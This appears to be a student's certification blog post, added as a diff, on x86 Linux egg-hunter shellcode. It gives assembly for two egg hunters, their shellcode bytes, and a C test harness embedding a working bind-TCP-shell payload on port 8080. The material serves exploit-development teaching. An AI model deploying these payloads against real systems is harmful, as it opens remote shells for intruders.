@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=ff3500eed5a75a68d749d7b17422f0859d1af87a">
+
+<!-- Begin Jekyll SEO tag v2.5.0 -->
+<title>Assignment 3 | SLAE-x86</title>
+<meta name="generator" content="Jekyll v3.8.5" />
+<meta property="og:title" content="Assignment 3" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="x86 Assembly Language and Shellcoding on Linux" />
+<meta property="og:description" content="x86 Assembly Language and Shellcoding on Linux" />
+<link rel="canonical" href="http://localhost:4000/02_egghunter/" />
+<meta property="og:url" content="http://localhost:4000/02_egghunter/" />
+<meta property="og:site_name" content="SLAE-x86" />
+<script type="application/ld+json">
+{"url":"http://localhost:4000/02_egghunter/","headline":"Assignment 3","description":"x86 Assembly Language and Shellcoding on Linux","@type":"WebPage","@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <h1>SLAE-x86</h1>
+        <h2>x86 Assembly Language and Shellcoding on Linux</h2>
+
+        <section id="downloads">
+          
+          <a href="https://github.com/parzio/SLAE-x86" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h1 id="assignment-3">Assignment 3</h1>
+
+<ul>
+  <li>Study about Egg Hunters shellcode</li>
+  <li>Create a working demo of the Egghunter</li>
+  <li>Should be configurable for different payloads</li>
+</ul>
+
+<h2 id="what-is-a-egg-hunter">What is a Egg Hunter?</h2>
+
+<p>In classic stack based buffer overflow, the buffer size is big enough to hold the shellcode, but what happen if this is not the case? 
+Let’s assume that our shellcode is 100 bytes and we have only 35 bytes available, where should be stored the left 65 bytes?</p>
+
+<p>Well, Egg hunting technique was introduced to overcome this condition!</p>
+
+<p>An Egg Hunter is a tiny payload that searches in the virtual memory of the process for an <em>egg</em>, which is nothing more than a tag that denotes the start of the shellcode to execute. 
+In other words, when using an Egg Hunter we are talking about a two stage shellcode:</p>
+
+<ol>
+  <li>A tiny payload - injected exploiting a buffer overflow - that looks for an egg and once found it pass the execution there;</li>
+  <li>The real payload to execute - passed to the program using an input parameter - whose start is denoted by the egg searched by the previous payload.</li>
+</ol>
+
+<p>The requirements for an Egg Hunter are <strong>being small</strong>, but <strong>robust</strong> enough to avoid any crash in the program exploited due to memory access violations (unallocated memory or locations in memory which our user doesn’t have permission to read). The attacker, depending on the scenario, is required to find the right balance betweem them.</p>
+
+<p>Well, next question is, how do we safely inspect the virtual address space of a process? Firstly, knowing the target operating system is crucial. Being this assignment focused on Linux, let’s inspect the several ways already studied in literature for that operating system. The document written by <em>skape</em>, which can be found at <a href="http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf">http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf</a>, is illuminating and explains in details several approaches. Its read is strongly suggested.</p>
+
+<h2 id="execution">Execution</h2>
+
+<p>I decided to dive into the implementation of the Egg Hunger using the <strong>sigaction</strong> syscall. The following is the code implemented.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>; Author :  Alessio Parzian
+; Filename: egghunter_sigaction.asm
+
+; compile with:
+; 	nasm -f elf32 egghunter_sigaction.asm
+;	ld -o egghunter_sigaction egghunter_sigaction.o
+; extract shellcode with:
+; 	objdump -d egghunter_sigaction | grep -Po '\s\K[a-f0-9]{2}(?=\s)' | sed 's/^/\\x/g' | perl -pe 's/\r?\n//' | sed 's/$/\n/'
+
+global _start
+
+section .text
+
+_start:
+
+align_page:
+    or  cx, 0xfff       ; setting lower 16 bits to 4095
+
+next_address:
+    inc ecx             ; moving it to 4096 (usual page size for x86 systems), this allow to avoid null chars 
+
+    ; ==================
+    ; sigaction syscall
+    ; ==================
+    ; &gt; man 2 sigaction
+    ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
+    ; ------------------
+    xor eax, eax        ; zeroing register
+    mov al, 0x43        ; syscall number sigaction 
+    int 0x80            ; interrupt to ask for syscall execution
+    ; ------------------
+    
+    cmp al, 0xf2        ; eax will contain 0xf2 (EFAULT) in case of invalid memory
+    jz align_page       ; if ZF flag is set it means an invalid page address was found, thus a page alignment is required
+    
+    ; ==================
+    ; scasd call
+    ; ==================
+    ; &gt; https://en.wikipedia.org/wiki/X86_instruction_listings
+    ; ------------------
+    mov eax, 0xFCFCFCFC ; moving value of the egg as method parameter 
+    mov edi, ecx        ; moving address of valid memory to scan 
+    scasd               ; compares ES:[(E)DI] with EAX and increments or decrements (E)DI, depending on DF; can be prefixed with REP
+    ; ------------------
+    
+    jnz next_address 	; if it doesn't match increase memory by one byte and try again
+    
+    ; ==================
+    ; scasd call
+    ; ==================
+    ; &gt; https://en.wikipedia.org/wiki/X86_instruction_listings
+    ; ------------------
+    scasd               ; scan again to check for the second part of the egg, this is required to avoid to find the egg in the egghunter
+                        ; and believing to have found the one in the shellcode
+                        ; parameters in registers are already set
+    ; ------------------
+    
+    jnz next_address    ; if it dosent match increase memory by one byte and try again
+    
+    jmp edi             ; if this opcode is executed it means the was found and it the moment to pass the execution to the shellcode
+</code></pre></div></div>
+
+<p>The resulting shellcode is:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\x66\x81\xc9\xff\x0f\x41\x31\xc0\xb0\x43\xcd\x80\x3c\xf2\x74\xf0\xb8\xfc\xfc\xfc\xfc\x89\xcf\xaf\x75\xeb\xaf\x75\xe8\xff\xe7
+</code></pre></div></div>
+
+<p>It is 31 bytes long and contains no null bytes! However, what about if there would be the need of having an even smaller Egg Hunter? Probably, the robustness of the implemention should be sacrificed, but it might become a need in some real world exploitation scenarios. Let’s have a look how we could decrease its size.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>; Author :  Alessio Parzian
+; Filename: egghunter_minimal.asm
+
+; compile with:
+; 	nasm -f elf32 egghunter_minimal.asm
+;	ld -o egghunter_minimal egghunter_minimal.o
+; extract shellcode with:
+; 	objdump -d egghunter_minimal | grep -Po '\s\K[a-f0-9]{2}(?=\s)' | sed 's/^/\\x/g' | perl -pe 's/\r?\n//' | sed 's/$/\n/'
+
+; This is the smallest payload that I studied following &lt;https://www.exploit-db.com/exploits/44334&gt;
+; However, this egghunter assumes that the egg is located in lower addresses than itself (it starts from it)
+; if that wouldn't be the case probably the hunter will make the process crash trying to access invalid memory areas
+
+global _start
+
+section .text
+
+_start:
+	inc eax
+	; the egg MUST BE EXECUTABLE 
+	; 00000000  4F	dec di
+	; 00000001  90	nop
+	; 00000002  47  inc di
+	; 00000003  90  nop
+	cmp DWORD [eax], 0x4f904790
+	jne	_start
+	jmp eax
+</code></pre></div></div>
+
+<p>The resulting shellcode is:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\x40\x81\x38\x90\x47\x90\x4f\x75\xf7\xff\xe0
+</code></pre></div></div>
+
+<p>It is 11 bytes long and contains no null bytes! Well, let’s implement a PoC to test the above reported egg hunters.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
+// Author: Alessio Parzian
+// Filename: test_egghunter.c
+//
+// Test your egghunter with a shellcode. Replace shellcode variable value with your own shell, compile and execute.
+// Compile with:
+//	gcc $file_name -fno-stack-protector -z execstack -o $out_name
+*/</span>
+
+<span class="cp">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+</span>
+<span class="c1">// Change eggs accordingly with your preference and the type of hunter chosen
+</span><span class="cp">#define EXECEGG0 "\xfc\xfc\xfc\xfc" // NO NEED OF EXECUTION
+#define EXECEEG1 "\x90\x47\x90\x4f" // NEED OF EXECUTION (order reversed in egg_hunter1)
+</span>
+<span class="c1">// Change shellcodes based on your needs!
+</span> 
+<span class="c1">// ====================
+// SIGACTION EGGHUNTER
+// ====================
+</span>
+<span class="c1">// Size: 31 bytes
+</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">egg_hunter0</span><span class="p">[]</span> <span class="o">=</span> \
+<span class="s">"</span><span class="se">\x66\x81\xc9\xff\x0f\x41\x31\xc0\xb0\x43\xcd\x80\x3c\xf2\x74\xf0\xb8</span><span class="s">"</span>
+<span class="n">EXECEGG0</span>
+<span class="s">"</span><span class="se">\x89\xcf\xaf\x75\xeb\xaf\x75\xe8\xff\xe7</span><span class="s">"</span><span class="p">;</span>
+
+<span class="c1">// Bind TCP Shell on port 8080
+// Size 124 bytes
+</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode0</span><span class="p">[]</span> <span class="o">=</span> \
+<span class="n">EXECEGG0</span>
+<span class="n">EXECEGG0</span>
+<span class="c1">// Change shellcode here if you want other payloads
+</span><span class="s">"</span><span class="se">\x89\xe5\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x66\xb8\x67\x01</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\xb3\x02\xb1\x01\xcd\x80\x89\xc6\x66\xb8\x69\x01\x89\xf3\x52\x66</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x68\x1f\x90\x66\x6a\x02\x89\xe1\x31\xd2\x83\xc2\x10\xcd\x80\x66</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\xb8\x6b\x01\x89\xf3\x31\xc9\xcd\x80\x66\xb8\x6c\x01\x89\xf3\x31</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\xd2\x52\x52\x89\xe1\x6a\x02\x89\xe2\x31\xf6\xcd\x80\x89\xc3\x31</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\xc9\xb1\x03\x31\xc0\xb0\x3f\xfe\xc9\xcd\x80\x75\xf6\x31\xc0\x50</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\xb0\x0b\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xff</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x57\x89\xe2\x53\x89\xe1\xcd\x80</span><span class="s">"</span><span class="p">;</span>
+
+<span class="c1">// ====================
+// SMALLEST EGGHUNTER
+// ====================
+</span>
+<span class="c1">// Size: 11 bytes
+</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">egg_hunter1</span><span class="p">[]</span> <span class="o">=</span> \
+<span class="s">"</span><span class="se">\x40\x81\x38\x90\x47\x90\x4f\x75\xf7\xff\xe0</span><span class="s">"</span><span class="p">;</span>
+
+<span class="c1">// Bind TCP Shell on port 8080
+// Size: 128 bytes
+</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode1</span><span class="p">[]</span> <span class="o">=</span> \
+<span class="n">EXECEEG1</span>
+<span class="c1">// Change shellcode here if you want other payloads
+</span><span class="s">"</span><span class="se">\x89\xe5\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x66\xb8\x67\x01</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\xb3\x02\xb1\x01\xcd\x80\x89\xc6\x66\xb8\x69\x01\x89\xf3\x52\x66</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x68\x1f\x90\x66\x6a\x02\x89\xe1\x31\xd2\x83\xc2\x10\xcd\x80\x66</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\xb8\x6b\x01\x89\xf3\x31\xc9\xcd\x80\x66\xb8\x6c\x01\x89\xf3\x31</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\xd2\x52\x52\x89\xe1\x6a\x02\x89\xe2\x31\xf6\xcd\x80\x89\xc3\x31</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\xc9\xb1\x03\x31\xc0\xb0\x3f\xfe\xc9\xcd\x80\x75\xf6\x31\xc0\x50</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\xb0\x0b\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xff</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x57\x89\xe2\x53\x89\xe1\xcd\x80</span><span class="s">"</span><span class="p">;</span>
+
+<span class="kt">void</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Length of Egg Hunter Shellcode:  %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">egg_hunter1</span><span class="p">));</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Length of the Actual Shellcode:  %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">shellcode1</span><span class="p">));</span>
+    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">egg_hunter1</span><span class="p">;</span>
+    <span class="n">ret</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Well, this concludes assignment 3!</p>
+
+<p><br /></p>
+
+<hr />
+
+<p><em>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification.</em></p>
+
+<p><a href="http://securitytube-training.com/online-courses/security-tube-linux-assembly-expert">http://securitytube-training.com/online-courses/security-tube-linux-assembly-expert</a></p>
+
+<p><em>Student-ID: PA-8733</em></p>
+
+      </section>
+    </div>
+
+    
+  </body>
+</html>
